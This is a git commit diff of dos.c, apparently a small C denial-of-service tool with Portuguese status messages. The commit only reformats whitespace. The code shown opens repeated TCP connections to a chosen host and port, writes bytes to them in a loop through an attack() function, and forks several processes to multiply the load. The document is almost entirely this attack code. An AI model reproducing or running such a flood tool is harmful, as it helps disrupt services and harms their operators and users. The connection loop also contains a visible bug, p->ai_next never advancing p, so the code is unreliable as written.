b3de1f6177407f13c08ac78faf12e51f52d16de3
ksx1777 <70083608+ksx1777@users.noreply.github.com>
2020-08-25 19:05:55 -0300

    Update dos.c

--- dos.c
+++ dos.c
@@ -7,30 +7,30 @@ int init_sockets(char *host, char *port){
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
 	if((r=getaddrinfo(host, port, &hints, &info)) != 0){
-		printf(RED" [!] erro ao resolver dns.\n"RESET);
-		return 1;
+	    printf(RED" [!] erro ao resolver dns.\n"RESET);
+            return 1;
 	}
 	for(p = info; p != NULL; p->ai_next){
 		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1){
-			continue;
+		    continue;
 		}
 
 		if(connect(sock, p->ai_addr, p->ai_addrlen) == -1){
-			close(sock);
-			continue;
+		    close(sock);
+		    continue;
 		}
 		break;
 	}
 	if (p == NULL){
 		if(info){
-			freeaddrinfo(info);
+	            freeaddrinfo(info);
 		}
 		printf(RED" [!] erro: conexão não pode ser feita.\n"RESET);
 		return 1;
 	}
 	if (info){
 		freeaddrinfo(info);
-    }
+    	}
 	printf(GREEN" [*] conexão estabelecida ===> %s:%s\n"RESET, host, port);
 	return sock;
 }
@@ -46,30 +46,30 @@ void attack(char *host, char *port, int sock_num){
 		for(int x = 0; x != s_count; x++){
 			if (sockets[x] == 0){
 				sockets[x] = init_sockets(host, port);
-            }
-    		r = write(sockets[x], "\0", 1);
+        	        }
+    			r = write(sockets[x], "\0", 1);
 			if (r == -1){
 				close(sockets[x]);
 				sockets[x] = init_sockets(host, port);
 			}
 		}
-        i = i + sock_num;
+        	i+= sock_num;
 		printf(" [*] requisições enviadas ==> %i\n", i);
 		usleep(s_time);
 	}
 }
 
 int main(int argc, char **argv){
-	if(parse_args(argc, argv)){
-		return 1;
-	}
+    if(parse_args(argc, argv)){
+	return 1;
+    }
     printf("%i - %i", s_count, t_count);
     usleep(2000000);
 	for(int i = 0; i <= t_count; i++){
-		if(fork()){
-			attack(host, port, i);
-		}
-		usleep(200000);
+            if(fork()){
+		attack(host, port, i);
+	    }
+	    usleep(200000);
 	}
-	return 0;
+    return 0;
 }
